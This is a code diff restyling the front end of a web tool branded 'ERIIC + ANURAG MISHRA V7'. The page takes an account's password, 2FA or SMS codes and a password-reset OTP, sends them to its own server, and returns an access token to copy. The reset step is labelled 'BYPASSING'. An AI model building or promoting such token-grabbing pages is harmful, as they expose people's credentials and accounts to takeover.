@@ -12,77 +12,163 @@
         --err:#e11d48; --warn:#d97706; --ok:#16a34a; --line:#e5e7eb;
     }
     *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+    html,body{height:100%;}
     body{
         font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
         background:radial-gradient(circle at 12% 8%, rgba(0,184,148,.12), transparent 45%),
                    radial-gradient(circle at 88% 92%, rgba(123,47,247,.12), transparent 50%),
+                   radial-gradient(circle at 50% 50%, rgba(255,45,149,.06), transparent 60%),
                    var(--bg);
-        color:var(--text); margin:0; min-height:100dvh;
-        display:flex; justify-content:center; align-items:center; padding:16px; overflow-x:hidden;
+        background-attachment:fixed; color:var(--text); margin:0; min-height:100dvh;
+        display:flex; justify-content:center; align-items:center; padding:16px; overflow-x:hidden; position:relative;
     }
+
+    /* Floating orbs (soft pastel) */
+    .orb{position:fixed;border-radius:50%;filter:blur(80px);opacity:.5;z-index:0;pointer-events:none;}
+    .orb1{width:260px;height:260px;background:#a7f3d0;top:-90px;left:-90px;animation:float1 11s ease-in-out infinite;}
+    .orb2{width:300px;height:300px;background:#ddd6fe;bottom:-110px;right:-110px;animation:float2 13s ease-in-out infinite;}
+    .orb3{width:200px;height:200px;background:#fbcfe8;top:45%;left:-120px;opacity:.35;animation:float1 15s ease-in-out infinite reverse;}
+    @keyframes float1{0%,100%{transform:translate(0,0) scale(1);}50%{transform:translate(35px,-30px) scale(1.12);}}
+    @keyframes float2{0%,100%{transform:translate(0,0) scale(1);}50%{transform:translate(-30px,25px) scale(1.1);}}
+
     .container{
         position:relative; z-index:2; width:100%; max-width:430px;
-        background:rgba(255,255,255,.95); backdrop-filter:blur(18px);
+        background:rgba(255,255,255,.95); backdrop-filter:blur(18px); -webkit-backdrop-filter:blur(18px);
         border-radius:24px; border:1px solid rgba(0,184,148,.25);
-        box-shadow:0 20px 60px rgba(30,30,60,.12);
-        padding:22px 20px; text-align:center; overflow:hidden;
+        box-shadow:0 0 0 1px rgba(0,0,0,.02),0 20px 60px rgba(30,30,60,.12),0 0 60px rgba(0,184,148,.08);
+        padding:28px 22px 22px; text-align:center; overflow:hidden;
         animation:cardIn .8s cubic-bezier(.2,.9,.3,1.2) both;
     }
     @keyframes cardIn{from{opacity:0;transform:translateY(40px) scale(.94);}to{opacity:1;transform:none;}}
-    
-    .brand{margin-bottom:15px;}
-    h1{margin:0; font-size:1.25rem; font-weight:900; letter-spacing:1px; line-height:1.25;}
-    h1 .amp{color:var(--neon3);}
-    h1 .v7{background:linear-gradient(135deg,var(--neon3),var(--neon2)); color:#fff; padding:2px 8px; border-radius:6px; font-size:0.65rem; vertical-align:middle; margin-left:4px;}
 
-    /* TABS */
+    /* Animated border & top glow */
+    .container::before{
+        content:""; position:absolute; inset:0; border-radius:24px; padding:1.5px;
+        background:linear-gradient(120deg,transparent 15%,var(--neon) 30%,transparent 45%,var(--neon2) 60%,transparent 75%,var(--neon3) 90%,transparent);
+        background-size:300% 300%;
+        -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+        -webkit-mask-composite:xor;mask-composite:exclude;
+        animation:borderFlow 7s linear infinite; pointer-events:none;
+    }
+    @keyframes borderFlow{0%{background-position:0% 50%;}100%{background-position:300% 50%;}}
+    .container::after{
+        content:""; position:absolute; top:0; left:50%; transform:translateX(-50%);
+        width:60%; height:3px; background:linear-gradient(90deg,transparent,var(--neon),var(--neon2),transparent);
+        border-radius:0 0 10px 10px; animation:topGlow 3s ease-in-out infinite;
+    }
+    @keyframes topGlow{0%,100%{opacity:.6;width:50%;}50%{opacity:1;width:75%;}}
+
+    /* Branding */
+    .brand{display:flex; flex-direction:column; align-items:center; gap:8px; margin-bottom:18px;}
+    h1{
+        margin:0; font-size:1.35rem; font-weight:900; letter-spacing:1.2px; line-height:1.25;
+        background:linear-gradient(120deg,#1a1a2e 20%,var(--neon) 45%,#1a1a2e 55%,var(--neon2) 80%,#1a1a2e);
+        background-size:250% auto; -webkit-background-clip:text; background-clip:text;
+        -webkit-text-fill-color:transparent; animation:textShine 5s linear infinite;
+    }
+    @keyframes textShine{0%{background-position:0% center;}100%{background-position:250% center;}}
+    h1 .amp{color:var(--neon3); -webkit-text-fill-color:var(--neon3);}
+    h1 .v7{
+        display:inline-block; font-size:.65rem; letter-spacing:1px; background:linear-gradient(135deg,var(--neon3),var(--neon2));
+        color:#fff; -webkit-text-fill-color:#fff; padding:2px 8px; border-radius:6px; vertical-align:middle; margin-left:4px;
+        box-shadow:0 4px 14px rgba(255,45,149,.4); animation:v7pop 2s ease-in-out infinite;
+    }
+    @keyframes v7pop{0%,100%{transform:scale(1);}50%{transform:scale(1.08);}}
+
+    /* Tabs */
     .tabs{display:flex; background:#f3f4f6; border-radius:12px; padding:4px; margin-bottom:20px;}
     .tab-btn{flex:1; padding:10px; border:none; background:none; font-weight:700; font-size:0.85rem; color:var(--muted); border-radius:8px; cursor:pointer; transition:0.3s;}
     .tab-btn.active{background:#fff; color:var(--neon); box-shadow:0 2px 8px rgba(0,0,0,0.08);}
 
-    .input-group{margin-bottom:12px; text-align:left;}
+    /* Inputs & Buttons */
+    .input-group{margin-bottom:12px; text-align:left; animation:fadeUp .6s both;}
+    .input-group:nth-child(2){animation-delay:.08s;}
     label{display:block; margin-bottom:6px; color:#4b5563; font-size:.75rem; font-weight:600;}
     input{
-        width:100%; padding:12px 14px; border-radius:10px; border:1.5px solid var(--line);
-        background:#f9fafb; color:var(--text); font-size:.95rem; outline:none; transition:.2s;
+        width:100%; padding:13px 14px; border-radius:10px; border:1.5px solid var(--line);
+        background:#f9fafb; color:var(--text); font-size:.95rem; outline:none; transition:.25s; font-family:inherit;
     }
     input:focus{border-color:var(--neon); background:#fff; box-shadow:0 0 0 3px rgba(0,184,148,.13);}
+    input::placeholder{color:#9ca3af; font-size:.88rem;}
 
     .main-btn{
         width:100%; padding:14px; border:none; border-radius:11px;
         background:linear-gradient(135deg,var(--neon) 0%, #00ceaa 60%, var(--neon2) 140%);
-        color:#fff; font-weight:900; font-size:.9rem; cursor:pointer; transition:0.3s;
-        box-shadow:0 4px 15px rgba(0,184,148,.35);
+        background-size:200% auto; color:#fff; font-weight:900; font-size:.9rem;
+        letter-spacing:1px; cursor:pointer; margin-top:8px; position:relative; overflow:hidden;
+        transition:.3s; font-family:inherit; box-shadow:0 4px 15px rgba(0,184,148,.35);
     }
-    .main-btn:hover{transform:translateY(-2px);}
+    .main-btn:hover{transform:translateY(-2px); background-position:right center; box-shadow:0 8px 25px rgba(0,184,148,.5);}
     .main-btn:disabled{opacity:.7; cursor:not-allowed; transform:none;}
 
-    .hidden{display:none !important;}
+    /* Messages */
     #message{margin-top:12px; font-size:.85rem;}
-    .error-block{background:rgba(225,29,72,.08); border:1px solid rgba(225,29,72,.3); color:var(--err); padding:12px; border-radius:10px; text-align:left; display:flex; gap:10px;}
+    .hidden{display:none !important;}
+    .error-block{
+        background:rgba(225,29,72,.08); border:1px solid rgba(225,29,72,.3);
+        color:var(--err); padding:12px; border-radius:10px; text-align:left;
+        display:flex; align-items:center; gap:10px; animation:shake .5s;
+    }
+    @keyframes shake{0%,100%{transform:translateX(0);}20%{transform:translateX(-8px);}40%{transform:translateX(7px);}60%{transform:translateX(-5px);}80%{transform:translateX(4px);}}
     .success-block{background:rgba(22,163,74,.08); border:1px solid rgba(22,163,74,.3); color:var(--ok); padding:12px; border-radius:10px; text-align:left;}
 
-    .token-box{
-        margin-top:15px; background:#f0fdf9; padding:15px; border-radius:12px;
-        word-break:break-all; font-family:monospace; font-size:.8rem;
-        border:1.5px dashed var(--neon); color:#047857; font-weight:600; text-align:left;
-    }
-    
-    /* Loaders & Steps */
-    .step-box { animation: fadeUp 0.4s ease; }
-    @keyframes fadeUp { from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }
-    .spinner { width:20px; height:20px; border:3px solid rgba(0,184,148,0.2); border-top-color:var(--neon); border-radius:50%; animation:spin 1s linear infinite; display:inline-block; vertical-align:middle; margin-right:8px;}
+    /* Loaders */
+    .spinner {width:18px; height:18px; border:3px solid rgba(0,184,148,0.2); border-top-color:var(--neon); border-radius:50%; animation:spin 1s linear infinite; display:inline-block; vertical-align:middle; margin-right:8px;}
+    .spinner-white {border-color:rgba(255,255,255,0.3); border-top-color:#fff;}
     @keyframes spin { to { transform: rotate(360deg); } }
-    
-    .timer-text { font-size:0.75rem; color:var(--muted); margin-top:5px; text-align:center; }
+    @keyframes fadeUp{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:none;}}
 
+    /* Device Approval Box */
+    .device-check-box {
+        background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px;
+        padding: 20px; text-align: center; margin-bottom: 10px; animation: fadeUp 0.4s ease;
+    }
+    .device-check-icon {font-size: 3rem; margin-bottom: 10px; display: inline-block; animation: pulseIcon 2s infinite;}
+    @keyframes pulseIcon { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+    .device-title {font-size: 1.1rem; font-weight: 800; margin-bottom: 6px; color: var(--text);}
+    .device-desc {font-size: 0.8rem; color: var(--muted); margin-bottom: 15px;}
+    .warn-text {font-size:0.8rem; color:var(--warn); font-weight:700; margin-top:5px;}
+
+    /* Divider & Link Buttons */
+    .divider {display: flex; align-items: center; text-align: center; margin: 20px 0; color: #9ca3af; font-size: 0.8rem;}
+    .divider::before, .divider::after {content: ''; flex: 1; border-bottom: 1px solid var(--line);}
+    .divider::before {margin-right: 10px;} .divider::after {margin-left: 10px;}
+    .link-btn {background: none; border: none; color: var(--neon); font-weight: 700; font-size: 0.85rem; cursor: pointer; text-decoration: underline;}
+    .link-btn:hover {color: var(--neon2);}
+    .cancel-btn {color: var(--err); margin-top: 10px; display: block; width: 100%; text-decoration: none;}
+
+    /* Token Result */
+    .token-box {
+        margin-top: 15px; background: #f0fdf9; padding: 16px; border-radius: 13px;
+        word-break: break-all; font-family: monospace; font-size: .8rem;
+        border: 1.5px dashed var(--neon); color: #047857; font-weight: 600; text-align: left;
+        position: relative; overflow: hidden; animation: tokenReveal 0.8s cubic-bezier(0.2, 0.9, 0.3, 1.3) both;
+    }
+    @keyframes tokenReveal {0%{opacity:0;transform:scale(0.8);}100%{opacity:1;transform:scale(1);}}
+    
+    /* Mobile 9:16 Full Screen */
     @media (max-width: 600px){
         body{padding:0; align-items:stretch;}
-        .container{max-width:100%; min-height:100dvh; border-radius:0; display:flex; flex-direction:column; justify-content:center;}
+        .container{
+            max-width:100%; width:100%; min-height:100dvh; border-radius:0;
+            border-left:none; border-right:none; border-top:none; border-bottom:none;
+            padding:max(28px, env(safe-area-inset-top)) 22px max(22px, env(safe-area-inset-bottom));
+            display:flex; flex-direction:column; justify-content:center;
+            background:linear-gradient(170deg, #ffffff, #f7f9fc);
+            animation:mobileIn .7s cubic-bezier(.2,.9,.3,1.2) both;
+        }
+        @keyframes mobileIn{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:none;}}
+        .container::before{border-radius:0;}
+        h1{font-size:1.5rem;}
     }
 </style>
 </head>
 <body>
+    <!-- Floating background orbs -->
+    <div class="orb orb1"></div>
+    <div class="orb orb2"></div>
+    <div class="orb orb3"></div>
+
     <div class="container">
         <div class="brand">
             <h1>ERIIC <span class="amp">+</span> ANURAG MISHRA <span class="v7">V7</span></h1>
@@ -98,26 +184,28 @@
         <div id="login-form">
             <div class="input-group">
                 <label>Email / User ID</label>
-                <input type="text" id="uid" placeholder="Enter Email or ID">
+                <input type="text" id="uid" placeholder="Enter Email or ID" autocomplete="username">
             </div>
             <div class="input-group">
                 <label>Password</label>
-                <input type="password" id="password" placeholder="Enter Password">
+                <input type="password" id="password" placeholder="Enter Password" autocomplete="current-password">
             </div>
             <button id="login-btn" class="main-btn" onclick="handleLogin()">⚡ GET TOKEN</button>
         </div>
 
         <!-- ================= 2FA FORM ================= -->
-        <div id="2fa-form" class="hidden step-box">
-            <div id="device-approval-box" style="text-align:center; padding:15px 0;">
-                <div style="font-size:2.5rem; margin-bottom:10px; animation:pulse 2s infinite;">📱</div>
-                <h3 style="margin:0 0 5px; font-size:1rem;">Check your other device</h3>
-                <p style="font-size:0.8rem; color:var(--muted); margin-bottom:10px;">Approve the login request on your logged-in device.</p>
+        <div id="2fa-form" class="hidden">
+            <!-- Device Approval (Notification) -->
+            <div id="device-approval-box" class="device-check-box">
+                <div class="device-check-icon">📱</div>
+                <div class="device-title">Check your other device</div>
+                <div class="device-desc">Open the notification on your logged-in device and approve the request.</div>
                 <div class="spinner"></div>
-                <div style="font-size:0.8rem; color:var(--warn); font-weight:600; margin-top:5px;">Waiting for approval...</div>
+                <div class="warn-text">Waiting for approval...</div>
             </div>
 
-            <div id="otp-box" class="hidden" style="margin-top: 15px;">
+            <!-- Manual OTP Input -->
+            <div id="otp-box" class="hidden" style="margin-top: 10px;">
                 <div class="input-group" style="text-align: center;">
                     <label>Enter Code (SMS/Auth App)</label>
                     <input type="text" id="otp" placeholder="••••••" maxlength="6" style="text-align:center; letter-spacing:5px; font-size:1.2rem;">
@@ -125,16 +213,15 @@
                 <button id="otp-btn" class="main-btn" onclick="submitOTP()">✅ VERIFY CODE</button>
             </div>
 
-            <div style="margin: 15px 0; border-top: 1px solid var(--line);"></div>
-            <button id="try-another-btn" style="background:none; border:none; color:var(--neon); font-weight:700; font-size:0.85rem; text-decoration:underline; cursor:pointer;" onclick="toggleOTPBox()">Try another way (SMS Code)</button>
-            <button style="background:none; border:none; color:var(--err); font-weight:700; font-size:0.85rem; margin-top:10px; display:block; width:100%; cursor:pointer;" onclick="cancel2FA()">Cancel</button>
+            <div class="divider" id="2fa-divider">OR</div>
+            <button id="try-another-btn" class="link-btn" onclick="toggleOTPBox()">Try another way (SMS Code)</button>
+            <button id="cancel-btn" class="link-btn cancel-btn" onclick="cancel2FA()">Cancel & Go Back</button>
         </div>
 
-        <!-- ================= FORGOT PASSWORD (RECOVERY) FORM ================= -->
+        <!-- ================= FORGOT PASSWORD (RECOVERY) ================= -->
         <div id="recover-form" class="hidden">
-            
             <!-- Step 1: Send OTP -->
-            <div id="rec-step1" class="step-box">
+            <div id="rec-step1">
                 <div class="input-group">
                     <label>Email / Phone Number</label>
                     <input type="text" id="rec-uid" placeholder="Enter Email or Phone">
@@ -143,7 +230,7 @@
             </div>
 
             <!-- Step 2: Verify OTP -->
-            <div id="rec-step2" class="hidden step-box">
+            <div id="rec-step2" class="hidden">
                 <div class="input-group" style="text-align:center;">
                     <label>Enter OTP</label>
                     <input type="text" id="rec-otp" placeholder="••••••" maxlength="6" style="text-align:center; letter-spacing:5px; font-size:1.2rem;">
@@ -152,21 +239,20 @@
             </div>
 
             <!-- Step 3: New Password & Login -->
-            <div id="rec-step3" class="hidden step-box">
+            <div id="rec-step3" class="hidden">
                 <div class="input-group">
                     <label>Set New Password</label>
                     <input type="password" id="rec-newpw" placeholder="Enter New Password">
                 </div>
                 <button id="rec-btn3" class="main-btn" onclick="recResetAndLogin()">🔓 RESET & GET TOKEN</button>
             </div>
-
         </div>
 
-        <!-- MESSAGES & RESULT -->
+        <!-- ================= MESSAGES & RESULT ================= -->
         <div id="message"></div>
 
-        <div id="result" class="hidden step-box">
-            <p style="color:var(--ok); font-weight:900; margin-bottom:10px;">✅ SUCCESSFUL</p>
+        <div id="result" class="hidden">
+            <p style="color:var(--ok); font-weight:900; letter-spacing:1px; margin-bottom:10px;">✅ LOGIN SUCCESSFUL</p>
             <div class="token-box" id="token-display"></div>
             <button class="main-btn" style="background:#1a1a2e; margin-top:15px;" onclick="copyToken()">📋 COPY TOKEN</button>
         </div>
@@ -191,15 +277,19 @@
                 document.getElementById('login-form').classList.remove('hidden');
             } else {
                 document.getElementById('recover-form').classList.remove('hidden');
-                // Reset recover steps
                 document.getElementById('rec-step1').classList.remove('hidden');
                 document.getElementById('rec-step2').classList.add('hidden');
                 document.getElementById('rec-step3').classList.add('hidden');
             }
         }
 
-        function showError(text) { document.getElementById('message').innerHTML = `<div class="error-block">✕ ${text}</div>`; }
-        function showSuccessMsg(text) { document.getElementById('message').innerHTML = `<div class="success-block">✓ ${text}</div>`; }
+        function showError(text) {
+            const msg = document.getElementById('message');
+            msg.innerHTML = `<div class="error-block"><span>✕</span><span>${text}</span></div>`;
+        }
+        function showSuccessMsg(text) {
+            document.getElementById('message').innerHTML = `<div class="success-block">✓ ${text}</div>`;
+        }
         function clearMsg() { document.getElementById('message').innerHTML = ''; }
 
         // ================= LOGIN FLOW =================
@@ -207,70 +297,113 @@
             const uid = document.getElementById('uid').value.trim();
             const password = document.getElementById('password').value;
             const btn = document.getElementById('login-btn');
-            if(!uid || !password) return showError('Required fields missing');
-            
-            btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> WAIT...';
+
+            if(!uid || !password) return showError('Email and Password required');
+
+            btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-white"></span> CONNECTING...';
             clearMsg();
 
-            const fd = new FormData(); fd.append('uid', uid); fd.append('password', password);
+            const fd = new FormData();
+            fd.append('uid', uid); fd.append('password', password);
+
             try {
                 const res = await fetch('/login', { method: 'POST', body: fd });
                 const data = await res.json();
+                
                 btn.disabled = false; btn.innerHTML = '⚡ GET TOKEN';
 
                 if(data.two_factor) {
                     currentSessionId = data.session_id;
                     document.getElementById('login-form').classList.add('hidden');
                     document.getElementById('2fa-form').classList.remove('hidden');
-                    if(data.device_approval) startPolling();
-                    else toggleOTPBox();
+                    
+                    if(data.device_approval) {
+                        startPolling(); // Notification wala flow
+                    } else {
+                        toggleOTPBox(); // Direct OTP mangwao
+                    }
                 } else if(data.success) {
                     showResult(data.token);
                 } else {
-                    showError(data.error);
+                    showError(data.error || 'Login failed');
                 }
-            } catch(e) { btn.disabled = false; btn.innerHTML = '⚡ GET TOKEN'; showError('Network error'); }
+            } catch(e) {
+                btn.disabled = false; btn.innerHTML = '⚡ GET TOKEN';
+                showError('Network error');
+            }
         }
 
+        // Device Approval Polling
         function startPolling() {
             if(pollInterval) clearInterval(pollInterval);
+            
             pollInterval = setInterval(async () => {
-                const fd = new FormData(); fd.append('session_id', currentSessionId); fd.append('otp', '');
+                const fd = new FormData();
+                fd.append('session_id', currentSessionId);
+                fd.append('otp', ''); // Empty OTP = check approval status
+
                 try {
                     const res = await fetch('/two_factor', { method: 'POST', body: fd });
                     const data = await res.json();
-                    if(data.success) { clearInterval(pollInterval); showResult(data.token); }
-                    else if(!data.waiting) { clearInterval(pollInterval); showError(data.error); setTimeout(cancel2FA, 2000); }
-                } catch(e) {}
-            }, 4000);
+                    
+                    if(data.success) {
+                        clearInterval(pollInterval);
+                        showResult(data.token);
+                    } else if(!data.waiting) {
+                        clearInterval(pollInterval);
+                        showError(data.error);
+                        setTimeout(cancel2FA, 2000);
+                    }
+                } catch(e) { console.log("Polling..."); }
+            }, 4000); // Check every 4 sec
         }
 
         function toggleOTPBox() {
             document.getElementById('device-approval-box').classList.add('hidden');
             document.getElementById('otp-box').classList.remove('hidden');
             document.getElementById('try-another-btn').classList.add('hidden');
-            if(pollInterval) clearInterval(pollInterval);
+            document.getElementById('2fa-divider').classList.add('hidden');
+            if(pollInterval) clearInterval(pollInterval); // Stop polling if switching to manual
         }
 
         async function submitOTP() {
             const otp = document.getElementById('otp').value.trim();
-            if(!otp) return showError('Enter OTP');
+            if(!otp) return showError('Please enter the code');
             
-            const btn = document.getElementById('otp-btn'); btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> VERIFYING...';
-            const fd = new FormData(); fd.append('session_id', currentSessionId); fd.append('otp', otp);
+            const btn = document.getElementById('otp-btn');
+            btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-white"></span> VERIFYING...';
+            clearMsg();
+
+            const fd = new FormData();
+            fd.append('session_id', currentSessionId); fd.append('otp', otp);
+
             try {
                 const res = await fetch('/two_factor', { method: 'POST', body: fd });
                 const data = await res.json();
+                
                 btn.disabled = false; btn.innerHTML = '✅ VERIFY CODE';
-                if(data.success) showResult(data.token);
-                else showError(data.error);
-            } catch(e) { btn.disabled = false; btn.innerHTML = '✅ VERIFY CODE'; showError('Network error'); }
+
+                if(data.success) {
+                    showResult(data.token);
+                } else {
+                    showError(data.error || 'Invalid OTP');
+                }
+            } catch(e) {
+                btn.disabled = false; btn.innerHTML = '✅ VERIFY CODE';
+                showError('Network error');
+            }
         }
 
         function cancel2FA() {
             if(pollInterval) clearInterval(pollInterval);
             document.getElementById('2fa-form').classList.add('hidden');
             document.getElementById('login-form').classList.remove('hidden');
+            
+            // Reset to default state
+            document.getElementById('device-approval-box').classList.remove('hidden');
+            document.getElementById('otp-box').classList.add('hidden');
+            document.getElementById('try-another-btn').classList.remove('hidden');
+            document.getElementById('2fa-divider').classList.remove('hidden');
             clearMsg();
         }
 
@@ -279,13 +412,15 @@
             const uid = document.getElementById('rec-uid').value.trim();
             if(!uid) return showError('Enter Email/Phone');
             
-            const btn = document.getElementById('rec-btn1'); btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> SENDING...';
+            const btn = document.getElementById('rec-btn1');
+            btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-white"></span> SENDING...';
             clearMsg();
             
             const fd = new FormData(); fd.append('uid', uid);
             try {
                 const res = await fetch('/recover/send', { method: 'POST', body: fd });
                 const data = await res.json();
+                
                 btn.disabled = false; btn.innerHTML = '📩 SEND OTP';
                 
                 if(data.success) {
@@ -303,13 +438,15 @@
             const otp = document.getElementById('rec-otp').value.trim();
             if(!otp) return showError('Enter OTP');
             
-            const btn = document.getElementById('rec-btn2'); btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> VERIFYING...';
+            const btn = document.getElementById('rec-btn2');
+            btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-white"></span> VERIFYING...';
             clearMsg();
             
             const fd = new FormData(); fd.append('recover_id', recSessionId); fd.append('otp', otp);
             try {
                 const res = await fetch('/recover/verify', { method: 'POST', body: fd });
                 const data = await res.json();
+                
                 btn.disabled = false; btn.innerHTML = '✅ VERIFY OTP';
                 
                 if(data.success) {
@@ -326,13 +463,15 @@
             const pw = document.getElementById('rec-newpw').value;
             if(!pw || pw.length < 6) return showError('Password min 6 chars');
             
-            const btn = document.getElementById('rec-btn3'); btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> BYPASSING...';
+            const btn = document.getElementById('rec-btn3');
+            btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-white"></span> BYPASSING...';
             clearMsg();
             
             const fd = new FormData(); fd.append('recover_id', recSessionId); fd.append('password', pw);
             try {
                 const res = await fetch('/recover/reset', { method: 'POST', body: fd });
                 const data = await res.json();
+                
                 btn.disabled = false; btn.innerHTML = '🔓 RESET & GET TOKEN';
                 
                 if(data.success) {
@@ -351,12 +490,25 @@
             document.getElementById('recover-form').classList.add('hidden');
             document.getElementById('main-tabs').classList.add('hidden');
             document.getElementById('result').classList.remove('hidden');
-            document.getElementById('token-display').innerText = token;
+            
+            // Animate token display
+            const box = document.getElementById('token-display');
+            box.style.animation = 'none';
+            void box.offsetWidth;
+            box.style.animation = '';
+            box.innerText = token;
+            
             clearMsg();
         }
 
         function copyToken() {
-            navigator.clipboard.writeText(document.getElementById('token-display').innerText).then(() => alert('Token Copied!'));
+            const txt = document.getElementById('token-display').innerText;
+            navigator.clipboard.writeText(txt).then(() => {
+                const btn = event.target;
+                const old = btn.innerHTML;
+                btn.innerHTML = '✅ COPIED!';
+                setTimeout(() => btn.innerHTML = old, 1500);
+            });
         }
     </script>
 </body>
